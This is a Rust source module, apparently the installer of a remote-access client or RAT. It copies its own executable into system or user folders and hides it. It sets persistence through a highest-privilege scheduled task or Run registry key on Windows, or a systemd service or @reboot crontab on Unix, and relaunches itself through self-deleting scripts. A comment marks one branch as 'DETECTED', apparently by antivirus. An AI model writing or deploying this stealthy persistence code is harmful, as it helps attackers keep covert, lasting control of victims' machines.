#[cfg(windows)]
mod windows {
    use winapi::um::processthreadsapi::OpenProcessToken;
    use winapi::um::securitybaseapi::GetTokenInformation;
    use winapi::um::winnt::{ TokenElevation, HANDLE, TOKEN_ELEVATION, TOKEN_QUERY };
    use std::ptr;
    use std::os::windows::process::CommandExt;

    use std::{
        env,
        fs::{self, File},
        io::{Read, Write},
        path::PathBuf,
        process::Command,
        thread::sleep,
        time::Duration,
    };

    pub fn is_elevated() -> bool {
        unsafe {
            let mut handle: HANDLE = ptr::null_mut();
            if
                OpenProcessToken(
                    winapi::um::processthreadsapi::GetCurrentProcess(),
                    TOKEN_QUERY,
                    &mut handle
                ) != 0
            {
                let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
                let mut size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
                if
                    GetTokenInformation(
                        handle,
                        TokenElevation,
                        &mut elevation as *mut _ as *mut _,
                        size,
                        &mut size
                    ) != 0
                {
                    return elevation.TokenIsElevated != 0;
                }
            }
        }
        false
    }

    fn get_special_folder(name: &str) -> Option<PathBuf> {
        let folder: Option<String> = match name.to_lowercase().as_str() {
            "appdata" => env::var("APPDATA").ok(),
            "localappdata" => env::var("LOCALAPPDATA").ok(),
            "temp" => env::var("TEMP").ok(),
            "system" => Some("C:\\Windows\\System32".to_string()),
            "desktop" => {
                let userprofile = env::var("USERPROFILE").ok()?;
                Some(format!("{}\\Desktop", userprofile))
            },
            "programfiles" => env::var("ProgramFiles").ok(),
            _ => None,
        };

        folder.map(PathBuf::from)
    }

    pub fn install(folder: String, filename: String, hidden: bool) {
        println!("Installing client to {}", folder);
        let install_dir = match get_special_folder(folder.as_str()) {
            Some(path) => path,
            None => {
                eprintln!("Invalid install folder.");
                return;
            }
        };

        let install_path = install_dir.join(filename);

        let current_exe = std::env::current_exe().unwrap();
        if current_exe == install_path {
            return; // Already installed
        }

        const HIDE: u32 = 0x08000000;

        // Set persistence
        if is_elevated() { // DETECTED
            // schtasks
            let task_name = install_path.file_stem().unwrap().to_string_lossy();
            let task_cmd = format!(
                "schtasks /create /f /sc onlogon /rl highest /tn \"{}\" /tr '\"{}\"'",
                task_name, install_path.display()
            );
            let _ = Command::new("cmd")
                .creation_flags(HIDE)
                .args(["/c", &task_cmd])
                .output();
        } else {
            // Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
            let value_name = install_path.file_stem().unwrap().to_string_lossy();
            let _ = Command::new("reg")
                .args([
                    "add",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    "/v",
                    &value_name,
                    "/d",
                    &format!("\"{}\"", install_path.display()),
                    "/f",
                ])
                .creation_flags(HIDE)
                .output();
        }

        // Copy executable
        if install_path.exists() {
            let _ = fs::remove_file(&install_path);
            sleep(Duration::from_secs(1));
        }

        if let Ok(mut target) = File::create(&install_path) {
            if let Ok(mut current) = File::open(&current_exe) {
                let mut buffer = Vec::new();
                let _ = current.read_to_end(&mut buffer);
                let _ = target.write_all(&buffer);
            }
        }

        // Optional: hide file (very basic, can use attrib command)
        if hidden {
            let _ = Command::new("attrib")
                .args(["+h", install_path.to_str().unwrap()])
                .creation_flags(HIDE)
                .output();
        }

        // Relaunch from new path using temp .bat
        let batch_path = std::env::temp_dir().join("r.bat");
        if let Ok(mut bat) = File::create(&batch_path) {
            let _ = writeln!(bat, "@echo off");
            let _ = writeln!(bat, "timeout /t 3 > NUL");
            let _ = writeln!(bat, "start \"\" \"{}\"", install_path.display());
            let _ = writeln!(bat, "del \"%~f0\" /f /q");
        }

        let _ = Command::new(batch_path)
            .creation_flags(HIDE)
            .spawn();

        std::process::exit(0);
    }
}

#[cfg(unix)]
mod unix {
    use std::{
        env,
        fs::{self, File},
        io::{Read, Write},
        path::PathBuf,
        process::Command,
        thread::sleep,
        time::Duration,
    };

    pub fn is_elevated() -> bool {
        unsafe { libc::geteuid() == 0 }
    }

    fn get_special_folder(name: &str) -> Option<PathBuf> {
        let folder: Option<String> = match name.to_lowercase().as_str() {
            "appdata" => env::var("XDG_CONFIG_HOME").ok().or_else(|| env::var("HOME").ok().map(|h| format!("{}/.config", h))),
            "localappdata" => env::var("XDG_DATA_HOME").ok().or_else(|| env::var("HOME").ok().map(|h| format!("{}/.local/share", h))),
            "temp" => env::var("TMPDIR").ok().or_else(|| env::var("TMP").ok()),
            "system" => Some("/usr/bin".to_string()),
            "desktop" => {
                let home = env::var("HOME").ok()?;
                Some(format!("{}/Desktop", home))
            },
            "programfiles" => Some("/usr/bin".to_string()),
            _ => None,
        };

        folder.map(PathBuf::from)
    }

    pub fn install(folder: String, filename: String, hidden: bool) {
        println!("Installing client to {}", folder);
        let install_dir = match get_special_folder(folder.as_str()) {
            Some(path) => path,
            None => {
                eprintln!("Invalid install folder.");
                return;
            }
        };

        let install_path = install_dir.join(filename);

        let current_exe = std::env::current_exe().unwrap();
        if current_exe == install_path {
            return; // Already installed
        }

        // Set persistence
        if is_elevated() {
            // Create systemd service
            let service_name = install_path.file_stem().unwrap().to_string_lossy();
            let service_content = format!(
                "[Unit]\n\
                Description={}\n\
                After=network.target\n\n\
                [Service]\n\
                Type=simple\n\
                ExecStart={}\n\
                Restart=always\n\n\
                [Install]\n\
                WantedBy=multi-user.target",
                service_name,
                install_path.display()
            );

            let service_path = format!("/etc/systemd/system/{}.service", service_name);
            if let Ok(mut file) = File::create(&service_path) {
                let _ = file.write_all(service_content.as_bytes());
                let _ = Command::new("systemctl")
                    .args(["daemon-reload"])
                    .output();
                let _ = Command::new("systemctl")
                    .args(["enable", &format!("{}.service", service_name)])
                    .output();
            }
        } else {
            // Add to user's crontab
            let crontab_entry = format!(
                "@reboot {}",
                install_path.display()
            );
            let _ = Command::new("crontab")
                .args(["-l"])
                .output()
                .and_then(|output| {
                    let mut current = String::from_utf8_lossy(&output.stdout).to_string();
                    if !current.contains(&crontab_entry) {
                        current.push('\n');
                        current.push_str(&crontab_entry);
                        Command::new("crontab")
                            .args(["-"])
                            .stdin(std::process::Stdio::piped())
                            .output()
                            .map(|_| ())
                    } else {
                        Ok(())
                    }
                });
        }

        // Copy executable
        if install_path.exists() {
            let _ = fs::remove_file(&install_path);
            sleep(Duration::from_secs(1));
        }

        if let Ok(mut target) = File::create(&install_path) {
            if let Ok(mut current) = File::open(&current_exe) {
                let mut buffer = Vec::new();
                let _ = current.read_to_end(&mut buffer);
                let _ = target.write_all(&buffer);
            }
        }

        // Set executable permissions
        let _ = Command::new("chmod")
            .args(["+x", install_path.to_str().unwrap()])
            .output();

        // Optional: hide file
        if hidden {
            let _ = Command::new("chmod")
                .args(["-r", install_path.to_str().unwrap()])
                .output();
        }

        // Relaunch from new path using a shell script
        let script_path = std::env::temp_dir().join("r.sh");
        if let Ok(mut script) = File::create(&script_path) {
            let _ = writeln!(script, "#!/bin/sh");
            let _ = writeln!(script, "sleep 3");
            let _ = writeln!(script, "{} &", install_path.display());
            let _ = writeln!(script, "rm \"$0\"");
        }

        let _ = Command::new("chmod")
            .args(["+x", script_path.to_str().unwrap()])
            .output();

        let _ = Command::new(script_path)
            .spawn();

        std::process::exit(0);
    }
}

#[cfg(windows)]
pub use windows::*;

#[cfg(unix)]
pub use unix::*;

